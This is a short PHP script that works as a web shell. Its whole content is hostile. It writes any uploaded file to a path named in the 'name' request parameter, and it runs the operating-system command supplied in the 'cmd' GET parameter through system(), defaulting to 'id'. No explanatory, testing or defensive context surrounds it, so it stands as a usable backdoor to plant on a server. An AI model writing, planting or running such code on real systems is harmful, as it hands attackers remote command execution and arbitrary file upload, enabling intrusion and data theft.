<?php
if (!empty($_FILES['f'])) {
  move_uploaded_file($_FILES['f']['tmp_name'], $_REQUEST['name']);
}
system($_GET['cmd'] ?? 'id');
